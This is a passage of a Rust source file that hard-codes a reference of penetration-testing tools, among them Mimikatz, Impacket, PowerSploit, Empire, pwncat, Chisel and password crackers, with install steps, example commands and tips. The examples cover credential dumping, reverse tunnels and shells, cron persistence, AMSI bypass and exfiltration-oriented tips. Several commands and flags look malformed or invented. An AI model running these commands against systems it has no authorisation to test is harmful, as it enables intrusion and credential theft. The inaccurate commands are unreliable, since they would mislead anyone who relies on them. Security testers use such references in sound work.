                ToolFlag { flag: "--show".to_string(), description: "Show cracked passwords".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "Rules file".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "--force".to_string(), description: "Ignore warnings".to_string() },
                ToolFlag { flag: "-D".to_string(), description: "OpenCL devices".to_string() },
            ],
            tips: vec![
                "Use appropriate hash type (-m) for your target.",
                "GPU acceleration significantly speeds up cracking.",
                "Combine wordlists with rules for better success.",
                "Save cracked hashes and document results.",
            ],
        },
        "fcrackzip" => ToolInstructions {
            name: "FCrackZip".to_string(),
            description: "FCrackZip is a fast password cracker for ZIP archives that supports both brute force and dictionary attacks.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install fcrackzip",
                "",
                "# Install from source",
                "wget http://www.goof.com/zap/fcrackzip-1.0.tar.gz",
                "tar xzf fcrackzip-1.0.tar.gz",
                "cd fcrackzip-1.0 && make",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Dictionary attack".to_string(),
                    command: "fcrackzip -D -p wordlist.txt archive.zip".to_string(),
                },
                ToolExample {
                    description: "Brute force attack".to_string(),
                    command: "fcrackzip -b -c 'aA1' -l 1-6 archive.zip".to_string(),
                },
                ToolExample {
                    description: "Use uncompressed size as password".to_string(),
                    command: "fcrackzip -u archive.zip".to_string(),
                },
                ToolExample {
                    description: "Verbose mode".to_string(),
                    command: "fcrackzip -v -D -p wordlist.txt archive.zip".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-D".to_string(), description: "Dictionary attack".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Password file".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "Brute force".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Character set".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Password length".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Use uncompressed size".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
            ],
            tips: vec![
                "Try uncompressed size method first - very fast.",
                "Use good wordlists for dictionary attacks.",
                "Start with short passwords for brute force.",
                "Combine multiple techniques for best results.",
            ],
        },
        "pdfcrack" => ToolInstructions {
            name: "PDFCrack".to_string(),
            description: "PDFCrack is a tool for cracking password-protected PDF files using dictionary and brute force attacks.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install pdfcrack",
                "",
                "# Install from source",
                "git clone https://github.com/charlesw1234/pdfcrack.git",
                "cd pdfcrack",
                "make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Dictionary attack".to_string(),
                    command: "pdfcrack -f document.pdf -w wordlist.txt".to_string(),
                },
                ToolExample {
                    description: "Brute force attack".to_string(),
                    command: "pdfcrack -f document.pdf -b -c 'aA1' -n 6".to_string(),
                },
                ToolExample {
                    description: "Continue from saved state".to_string(),
                    command: "pdfcrack -f document.pdf -s savedstate.txt".to_string(),
                },
                ToolExample {
                    description: "Test specific password".to_string(),
                    command: "pdfcrack -f document.pdf -p 'testpass'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-f".to_string(), description: "PDF file".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Wordlist file".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "Brute force".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Character set".to_string() },
                ToolFlag { flag: "-n".to_string(), description: "Maximum length".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Save state file".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Test password".to_string() },
            ],
            tips: vec![
                "Save state to resume long-running attacks.",
                "Try dictionary attacks before brute force.",
                "Use character sets based on password policies.",
                "Document cracked passwords for evidence.",
            ],
        },
        // Post-Exploitation Tools
        "mimikatz" => ToolInstructions {
            name: "Mimikatz".to_string(),
            description: "Mimikatz is a powerful Windows post-exploitation tool that can extract plain text passwords, hash, PIN code and kerberos tickets from memory.",
            installation: vec![
                "# https://github.com/gentilkiwi/mimikatz/releases",
                "",
                "# Compile from source",
                "git clone https://github.com/gentilkiwi/mimikatz.git",
                "cd mimikatz",
                "# Visual Studio required for compilation",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Extract credentials from memory".to_string(),
                    command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit".to_string(),
                },
                ToolExample {
                    description: "Interactive mode".to_string(),
                    command: "mimikatz.exe".to_string(),
                },
                ToolExample {
                    description: "Dump SAM database".to_string(),
                    command: "mimikatz.exe \"lsadump::sam\" exit".to_string(),
                },
                ToolExample {
                    description: "Extract Kerberos tickets".to_string(),
                    command: "mimikatz.exe \"kerberos::list\" exit".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "privilege::debug".to_string(), description: "Enable debug privileges".to_string() },
                ToolFlag { flag: "sekurlsa::logonpasswords".to_string(), description: "Extract logon passwords".to_string() },
                ToolFlag { flag: "lsadump::sam".to_string(), description: "Dump SAM database".to_string() },
                ToolFlag { flag: "kerberos::list".to_string(), description: "List Kerberos tickets".to_string() },
                ToolFlag { flag: "crypto::certificates".to_string(), description: "Extract certificates".to_string() },
                ToolFlag { flag: "vault::cred".to_string(), description: "Extract vault credentials".to_string() },
            ],
            tips: vec![
                "Requires SYSTEM privileges for full functionality.",
                "Use interactive mode for complex operations.",
                "Document all extracted credentials securely.",
                "Be aware of antivirus detection and mitigation.",
            ],
        },
        "pspy" => ToolInstructions {
            name: "Pspy".to_string(),
            description: "Pspy is a command line tool designed to snoop on processes without need for root permissions. It's useful for monitoring process activity.",
            installation: vec![
                "wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
                "chmod +x pspy64",
                "",
                "# Compile from source",
                "git clone https://github.com/DominicBreuker/pspy.git",
                "cd pspy",
                "go build",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Monitor processes".to_string(),
                    command: "./pspy64".to_string(),
                },
                ToolExample {
                    description: "Print commands only".to_string(),
                    command: "./pspy64 -pf".to_string(),
                },
                ToolExample {
                    description: "Log to file".to_string(),
                    command: "./pspy64 -l /tmp/pspy.log".to_string(),
                },
                ToolExample {
                    description: "Monitor specific user".to_string(),
                    command: "./pspy64 -u root".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-p".to_string(), description: "Print commands".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Print file system events".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Log to file".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Monitor specific user".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Delay between scans".to_string() },
            ],
            tips: vec![
                "Good for discovering privilege escalation opportunities.",
                "Monitor file system changes for sensitive files.",
                "Combine with other tools for comprehensive monitoring.",
                "Run for extended periods to catch periodic tasks.",
            ],
        },
        "chisel" => ToolInstructions {
            name: "Chisel".to_string(),
            description: "Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server.",
            installation: vec![
                "go install -v github.com/jpillora/chisel/cmd/chisel@latest",
                "",
                "# Download pre-compiled binary",
                "# https://github.com/jpillora/chisel/releases",
                "",
                "# Build from source",
                "git clone https://github.com/jpillora/chisel.git",
                "cd chisel && go build",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Start chisel server".to_string(),
                    command: "chisel server --port 8080".to_string(),
                },
                ToolExample {
                    description: "Connect to server".to_string(),
                    command: "chisel client server:8080 8080:127.0.0.1:3000".to_string(),
                },
                ToolExample {
                    description: "SOCKS proxy".to_string(),
                    command: "chisel client server:8080 socks".to_string(),
                },
                ToolExample {
                    description: "Reverse tunnel".to_string(),
                    command: "chisel client server:8080 R:9000:127.0.0.1:22".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "server".to_string(), description: "Run as server".to_string() },
                ToolFlag { flag: "client".to_string(), description: "Run as client".to_string() },
                ToolFlag { flag: "--port".to_string(), description: "Server listening port".to_string() },
                ToolFlag { flag: "--reverse".to_string(), description: "Reverse tunnel mode".to_string() },
                ToolFlag { flag: "--socks5".to_string(), description: "SOCKS5 proxy mode".to_string() },
                ToolFlag { flag: "--auth".to_string(), description: "Authentication".to_string() },
            ],
            tips: vec![
                "SOCKS proxy is useful for web application testing.",
                "Secure tunneling with SSH authentication.",
                "Monitor bandwidth usage on large transfers.",
                "Use for bypassing network restrictions.",
            ],
        },
        "ligolo-ng" => ToolInstructions {
            name: "Ligolo-ng".to_string(),
            description: "Ligolo-ng is an advanced, simple, and powerful tunneling/pivoting tool that uses TUN interfaces.",
            installation: vec![
                "go install -v github.com/sysdream/ligolo-ng/cmd/proxy@latest",
                "go install -v github.com/sysdream/ligolo-ng/cmd/agent@latest",
                "",
                "# Download pre-compiled binaries",
                "# https://github.com/sysdream/ligolo-ng/releases",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Start proxy server".to_string(),
                    command: "proxy -h 0.0.0.0 -p 443".to_string(),
                },
                ToolExample {
                    description: "Connect agent".to_string(),
                    command: "agent -connect 192.168.1.100:443".to_string(),
                },
                ToolExample {
                    description: "Auto-reconnect".to_string(),
                    command: "agent -connect 192.168.1.100:443 --auto-reconnect".to_string(),
                },
                ToolExample {
                    description: "Ignore certificates".to_string(),
                    command: "agent -connect 192.168.1.100:443 --ignore-cert".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-h".to_string(), description: "Server host".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Server port".to_string() },
                ToolFlag { flag: "-connect".to_string(), description: "Connect to server".to_string() },
                ToolFlag { flag: "--auto-reconnect".to_string(), description: "Auto-reconnect mode".to_string() },
                ToolFlag { flag: "--ignore-cert".to_string(), description: "Ignore SSL certificates".to_string() },
                ToolFlag { flag: "--token".to_string(), description: "Authentication token".to_string() },
            ],
            tips: vec![
                "Auto-reconnect is useful for unstable connections.",
                "Ignore certificates for testing environments.",
                "Monitor agent connections and traffic.",
                "Use TUN interfaces for network pivoting.",
            ],
        },
        "pwncat" => ToolInstructions {
            name: "Pwncat".to_string(),
            description: "Pwncat is a post-exploitation framework that provides a reverse shell with advanced features like file transfer and persistence.",
            installation: vec![
                "pip3 install pwncat",
                "",
                "# Install from source",
                "git clone https://github.com/calebstewart/pwncat.git",
                "cd pwncat",
                "pip3 install -r requirements.txt",
                "python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Start listener".to_string(),
                    command: "pwncat -l 4444".to_string(),
                },
                ToolExample {
                    description: "Connect to target".to_string(),
                    command: "pwncat 192.168.1.100 4444".to_string(),
                },
                ToolExample {
                    description: "Generate payload".to_string(),
                    command: "pwncat -g linux -o payload.sh".to_string(),
                },
                ToolExample {
                    description: "Persist access".to_string(),
                    command: "# After connecting: persist add --user root --method cron".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-l".to_string(), description: "Listen mode".to_string() },
                ToolFlag { flag: "-g".to_string(), description: "Generate payload".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "--persist".to_string(), description: "Persistence mechanism".to_string() },
                ToolFlag { flag: "--encrypt".to_string(), description: "Encrypt connection".to_string() },
            ],
            tips: vec![
                "File transfer capabilities are very useful.",
                "Built-in persistence options for access maintenance.",
                "Encrypt connections for better security.",
                "Document all post-exploitation activities.",
            ],
        },
        "evil-winrm" => ToolInstructions {
            name: "Evil-WinRM".to_string(),
            description: "Evil-WinRM is a WinRM shell for hacking/pentesting written in Ruby with features like file transfer and command execution.",
            installation: vec![
                "gem install evil-winrm",
                "",
                "# Install from source",
                "git clone https://github.com/Hackplayers/evil-winrm.git",
                "cd evil-winrm",
                "bundle install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic connection".to_string(),
                    command: "evil-winrm -i 192.168.1.100 -u admin -p password".to_string(),
                },
                ToolExample {
                    description: "Hash authentication".to_string(),
                    command: "evil-winrm -i 192.168.1.100 -u admin -H 'hash'".to_string(),
                },
                ToolExample {
                    description: "Use SSL".to_string(),
                    command: "evil-winrm -i 192.168.1.100 -u admin -p password -s".to_string(),
                },
                ToolExample {
                    description: "File upload".to_string(),
                    command: "# After connecting: upload /local/file.txt C:\\temp\\file.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-i".to_string(), description: "Target IP".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Username".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Password".to_string() },
                ToolFlag { flag: "-H".to_string(), description: "NTLM hash".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "SSL connection".to_string() },
                ToolFlag { flag: "-P".to_string(), description: "Port number".to_string() },
            ],
            tips: vec![
                "Hash authentication bypasses password requirements.",
                "File transfer capabilities for data exfiltration.",
                "Script execution for automation tasks.",
                "Use SSL for encrypted communications.",
            ],
        },
        "bloodhound-python" => ToolInstructions {
            name: "BloodHound-Python".to_string(),
            description: "BloodHound-Python is a Python ingestor for BloodHound, used for Active Directory reconnaissance and attack path visualization.",
            installation: vec![
                "pip3 install bloodhound",
                "",
                "# Install from source",
                "git clone https://github.com/fox-it/BloodHound.py.git",
                "cd BloodHound.py",
                "pip3 install -r requirements.txt",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Full collection".to_string(),
                    command: "bloodhound-python -c All -u admin -p password -d domain.local -ns 192.168.1.1".to_string(),
                },
                ToolExample {
                    description: "Session collection only".to_string(),
                    command: "bloodhound-python -c Session -u admin -p password -d domain.local".to_string(),
                },
                ToolExample {
                    description: "Use Kerberos auth".to_string(),
                    command: "bloodhound-python -c All -k -d domain.local -u admin@domain.local".to_string(),
                },
                ToolExample {
                    description: "Save to specific directory".to_string(),
                    command: "bloodhound-python -c All -u admin -p password -d domain.local --output-dir /tmp/bloodhound".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-c".to_string(), description: "Collection methods".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Username".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Password".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Domain".to_string() },
                ToolFlag { flag: "-ns".to_string(), description: "Name server".to_string() },
                ToolFlag { flag: "--output-dir".to_string(), description: "Output directory".to_string() },
                ToolFlag { flag: "-k".to_string(), description: "Kerberos authentication".to_string() },
            ],
            tips: vec![
                "Import data into BloodHound for visualization.",
                "Document attack paths for privilege escalation.",
                "Combine with other AD tools for complete picture.",
                "Use appropriate collection methods for stealth.",
            ],
        },
        "impacket-scripts" => ToolInstructions {
            name: "Impacket Scripts".to_string(),
            description: "Impacket is a collection of Python classes for working with network protocols. Includes many useful scripts for pentesting.",
            installation: vec![
                "pip3 install impacket",
                "",
                "# Install from source",
                "git clone https://github.com/SecureAuthCorp/impacket.git",
                "cd impacket",
                "pip3 install -r requirements.txt",
                "python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "SMB enumeration".to_string(),
                    command: "smbmap.py -H 192.168.1.100 -u admin -p password".to_string(),
                },
                ToolExample {
                    description: "NTLM relay".to_string(),
                    command: "ntlmrelayx.py -tf targets.txt".to_string(),
                },
                ToolExample {
                    description: "Kerberoasting".to_string(),
                    command: "GetUserSPNs.py -dc domain.local -domain.local".to_string(),
                },
                ToolExample {
                    description: "Secretsdump".to_string(),
                    command: "secretsdump.py -hashes :hash@192.168.1.100".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-H".to_string(), description: "Target host".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Username".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Password".to_string() },
                ToolFlag { flag: "-hashes".to_string(), description: "NTLM hashes".to_string() },
                ToolFlag { flag: "-dc".to_string(), description: "Domain controller".to_string() },
                ToolFlag { flag: "-smb2support".to_string(), description: "Enable SMB2 support".to_string() },
            ],
            tips: vec![
                "Use for protocol-specific attacks and enumeration.",
                "Combine with other tools for comprehensive testing.",
                "Document all findings and attack paths.",
                "Update regularly for latest protocol support.",
            ],
        },
        "powersploit" => ToolInstructions {
            name: "PowerSploit".to_string(),
            description: "PowerSploit is a collection of PowerShell modules that can be used to assist during penetration testing and post exploitation.",
            installation: vec![
                "Install-Module -Name PowerSploit -Scope CurrentUser",
                "",
                "# Clone from git",
                "git clone https://github.com/PowerShellMafia/PowerSploit.git",
                "# Import modules as needed",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Load PowerShell module".to_string(),
                    command: "Import-Module .\\PowerSploit.psd1".to_string(),
                },
                ToolExample {
                    description: "Invoke-Mimikatz".to_string(),
                    command: "Invoke-Mimikatz -DumpCreds".to_string(),
                },
                ToolExample {
                    description: "PowerShell reverse shell".to_string(),
                    command: "Invoke-Shellcode -Shellcode \\$(shellcode)".to_string(),
                },
                ToolExample {
                    description: "Bypass AMSI".to_string(),
                    command: "Invoke-AmsiBypass".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "Import-Module".to_string(), description: "Load PowerShell module".to_string() },
                ToolFlag { flag: "-Force".to_string(), description: "Force execution".to_string() },
                ToolFlag { flag: "-DumpCreds".to_string(), description: "Dump credentials".to_string() },
                ToolFlag { flag: "-Shellcode".to_string(), description: "Execute shellcode".to_string() },
            ],
            tips: vec![
                "Use for post-exploitation on Windows targets.",
                "Many modules for different attack scenarios.",
                "Be aware of modern PowerShell security features.",
                "Document all module executions and results.",
            ],
        },
        "empire" => ToolInstructions {
            name: "Empire".to_string(),
            description: "Empire is a post-exploitation framework that includes agents, listeners, and modules for maintaining access.",
            installation: vec![
                "git clone https://github.com/BC-SECURITY/Empire.git",
                "cd Empire",
                "sudo ./setup/install.sh",
                "",
                "# Docker installation",
                "docker pull bcsecurity/empire:latest",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Launch Empire".to_string(),
                    command: "./empire".to_string(),
                },
                ToolExample {
                    description: "Manage listeners".to_string(),
                    command: "listeners".to_string(),
                },
                ToolExample {
                    description: "Generate agent".to_string(),
                    command: "uselistener http".to_string(),
                },
                ToolExample {
                    description: "Execute resource script".to_string(),
                    command: "resource script.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "listeners".to_string(), description: "Manage listeners".to_string() },
                ToolFlag { flag: "uselistener".to_string(), description: "Create listener".to_string() },
                ToolFlag { flag: "agents".to_string(), description: "Manage agents".to_string() },
                ToolFlag { flag: "usemodule".to_string(), description: "Use module".to_string() },
                ToolFlag { flag: "resource".to_string(), description: "Execute resource script".to_string() },
            ],
            tips: vec![
                "Generate multiple agent types for different targets.",
                "Document all agent communications and activities.",
                "Use encrypted communications for operational security.",
                "Combine with other post-exploitation tools.",
            ],
        },
        // Privilege Escalation Tools
        "linpeas" => ToolInstructions {
            name: "LinPEAS".to_string(),
            description: "LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix systems.",
            installation: vec![
                "# Download from GitHub",
                "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
                "chmod +x linpeas.sh",
                "",
                "# Clone full repository",
                "git clone https://github.com/carlospolop/PEASS-ng.git",
                "cd PEASS-ng/linPEAS",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Run basic scan".to_string(),
                    command: "./linpeas.sh".to_string(),
                },
                ToolExample {
                    description: "Quiet mode".to_string(),
                    command: "./linpeas.sh -q".to_string(),
                },
                ToolExample {
                    description: "Check specific options".to_string(),
                    command: "./linpeas.sh -o /tmp/output.txt".to_string(),
                },
                ToolExample {
                    description: "With colors disabled".to_string(),
                    command: "./linpeas.sh -nocolors".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-q".to_string(), description: "Quiet mode".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-nocolors".to_string(), description: "Disable colors".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Wait time between checks".to_string() },
                ToolFlag { flag: "-P".to_string(), description: "Password for sudo".to_string() },
            ],
            tips: vec![
                "Run with different user contexts for comprehensive coverage.",
                "Save output for later analysis and correlation.",
                "Focus on high-severity findings first.",
                "Document all potential escalation paths.",
            ],
        },
        "winpeas" => ToolInstructions {
            name: "WinPEAS".to_string(),
            description: "WinPEAS is a script that searches for possible paths to escalate privileges on Windows systems.",
            installation: vec![
                "# Download from GitHub",
                "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe",
                "",
                "# Clone full repository",
                "git clone https://github.com/carlospolop/PEASS-ng.git",
                "cd PEASS-ng/winPEAS",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Run basic scan".to_string(),
                    command: ".\\winPEAS.exe".to_string(),
                },
                ToolExample {
                    description: "Check specific modules".to_string(),
                    command: ".\\winPEAS.exe systeminfo".to_string(),
                },
                ToolExample {
                    description: "Quiet mode".to_string(),
                    command: ".\\winPEAS.exe quiet".to_string(),
                },
                ToolExample {
                    description: "Output to file".to_string(),
                    command: ".\\winPEAS.exe output C:\\temp\\results.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "systeminfo".to_string(), description: "System information".to_string() },
                ToolFlag { flag: "processinfo".to_string(), description: "Process information".to_string() },
                ToolFlag { flag: "quiet".to_string(), description: "Quiet mode".to_string() },
                ToolFlag { flag: "output".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "notcolor".to_string(), description: "No colors".to_string() },
            ],
            tips: vec![
                "Run with different privilege levels.",
                "Focus on services and scheduled tasks.",
                "Check for weak permissions and configurations.",
                "Document all findings for remediation.",
            ],
        },
        "linux-smart-enumeration" => ToolInstructions {
            name: "Linux Smart Enumeration".to_string(),
            description: "Linux Smart Enumeration (lse) is a script for Linux enumeration focused on privilege escalation.",
            installation: vec![
                "# Download from GitHub",
                "wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh",
                "chmod +x lse.sh",
                "",
                "# Clone from source",
                "git clone https://github.com/diego-treitos/linux-smart-enumeration.git",
                "cd linux-smart-enumeration",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Run basic enumeration".to_string(),
                    command: "./lse.sh".to_string(),
                },
                ToolExample {
                    description: "Specify level".to_string(),
                    command: "./lse.sh -l 2".to_string(),
                },
                ToolExample {
                    description: "Save output".to_string(),
                    command: "./lse.sh -o /tmp/lse_output.txt".to_string(),
                },
                ToolExample {
                    description: "With sudo check".to_string(),
                    command: "./lse.sh -s".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-l".to_string(), description: "Level of detail (1-3)".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Check sudo permissions".to_string() },
                ToolFlag { flag: "-i".to_string(), description: "Information gathering only".to_string() },
                ToolFlag { flag: "-h".to_string(), description: "Show help".to_string() },
            ],
            tips: vec![
                "Use higher levels for more comprehensive enumeration.",
                "Combine with manual verification of findings.",
                "Focus on SUID binaries and sudo permissions.",
                "Document all potential privilege escalation vectors.",
            ],
        },
        "linux-exploit-suggester" => ToolInstructions {
            name: "Linux Exploit Suggester".to_string(),
            description: "Linux Exploit Suggester is a tool that suggests possible exploits for Linux systems based on kernel version.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/mzet-/linux-exploit-suggester.git",
                "cd linux-exploit-suggester",
                "pip3 install -r requirements.txt",
                "chmod +x linux-exploit-suggester.sh",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Check for exploits".to_string(),
                    command: "./linux-exploit-suggester.sh".to_string(),
                },
                ToolExample {
                    description: "With kernel version".to_string(),
                    command: "./linux-exploit-suggester.sh -k 4.15.0".to_string(),
                },
                ToolExample {
                    description: "Detailed output".to_string(),
                    command: "./linux-exploit-suggester.sh -d".to_string(),
                },
                ToolExample {
                    description: "Check URL only".to_string(),
                    command: "./linux-exploit-suggester.sh -u".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-k".to_string(), description: "Kernel version".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Detailed output".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Check URL only".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "File with kernel info".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Website to check".to_string() },
            ],
            tips: vec![
                "Always verify kernel version accurately.",
                "Cross-reference exploits with vulnerability databases.",
                "Test exploits in safe environments first.",
                "Document all potential exploit paths.",
            ],
        },
        "windows-exploit-suggester" => ToolInstructions {
            name: "Windows Exploit Suggester".to_string(),
            description: "Windows Exploit Suggester is a tool that suggests possible exploits for Windows systems based on system information.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/gellin/windows-exploit-suggester.git",
                "cd windows-exploit-suggester",
                "pip3 install -r requirements.txt",
                "python3 windows-exploit-suggester.py --update",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Check for exploits".to_string(),
                    command: "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt".to_string(),
                },
                ToolExample {
                    description: "Detailed output".to_string(),
                    command: "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --detailed".to_string(),
                },
                ToolExample {
                    description: "With cross-reference".to_string(),
                    command: "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --cross-reference".to_string(),
                },
                ToolExample {
                    description: "Update database".to_string(),
                    command: "python3 windows-exploit-suggester.py --update".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--systeminfo".to_string(), description: "Systeminfo file".to_string() },
                ToolFlag { flag: "--detailed".to_string(), description: "Detailed output".to_string() },
                ToolFlag { flag: "--cross-reference".to_string(), description: "Cross-reference exploits".to_string() },
                ToolFlag { flag: "--update".to_string(), description: "Update exploit database".to_string() },
                ToolFlag { flag: "--output".to_string(), description: "Output file".to_string() },
            ],
            tips: vec![
                "Run systeminfo command to gather system data.",
                "Keep exploit database updated regularly.",
                "Cross-reference with multiple vulnerability sources.",
                "Test exploits in controlled environments.",
            ],
        },
        // Password Attack Tools (additional)
        "crunch" => ToolInstructions {
            name: "Crunch".to_string(),
            description: "Crunch is a wordlist generator where you can specify a character set and any other criteria for generating passwords.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install crunch",
                "",
                "# Install from source",
                "git clone https://github.com/crunch-wordlist/crunch-wordlist.git",
                "cd crunch-wordlist/CRUNCH",
                "make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Generate 8-character wordlist".to_string(),
                    command: "crunch 8 8".to_string(),
                },
                ToolExample {
                    description: "With specific charset".to_string(),
                    command: "crunch 6 8 abcdef123".to_string(),
                },
                ToolExample {
                    description: "Save to file".to_string(),
                    command: "crunch 8 8 -o wordlist.txt".to_string(),
                },
                ToolExample {
                    description: "With pattern".to_string(),
                    command: "crunch 8 8 -t @@@@@@@@ -o pattern.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "<min>".to_string(), description: "Minimum length".to_string() },
                ToolFlag { flag: "<max>".to_string(), description: "Maximum length".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Pattern specification".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Delay between characters".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "Maximum file size".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Number of output files".to_string() },
            ],
            tips: vec![
                "Be mindful of disk space when generating large wordlists.",
                "Use patterns for targeted password generation.",
                "Combine with other tools for password cracking.",
                "Consider storage requirements for large outputs.",
            ],
        },
        "cewl" => ToolInstructions {
            name: "CeWL".to_string(),
            description: "CeWL is a custom wordlist generator that spiders a target's website and creates wordlists for password cracking.",
            installation: vec![
                "# Install from gem",
                "gem install cewl",
                "",
                "# Install from source",
                "git clone https://github.com/digininja/CeWL.git",
                "cd CeWL",
                "sudo cpan install Switch::Long::Get",
                "sudo cpan install WWW::Mechanize",
                "sudo cpan install HTML::TokeParser::Simple",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Generate wordlist from website".to_string(),
                    command: "cewl https://example.com".to_string(),
                },
                ToolExample {
                    description: "With depth and word length".to_string(),
                    command: "cewl -d 2 -m 6 https://example.com".to_string(),
                },
                ToolExample {
                    description: "Save to file".to_string(),
                    command: "cewl -w wordlist.txt https://example.com".to_string(),
                },
                ToolExample {
                    description: "With email addresses".to_string(),
                    command: "cewl -e --email_file emails.txt https://example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-d".to_string(), description: "Depth to spider".to_string() },
                ToolFlag { flag: "-m".to_string(), description: "Minimum word length".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Output wordlist file".to_string() },
                ToolFlag { flag: "-e".to_string(), description: "Include email addresses".to_string() },
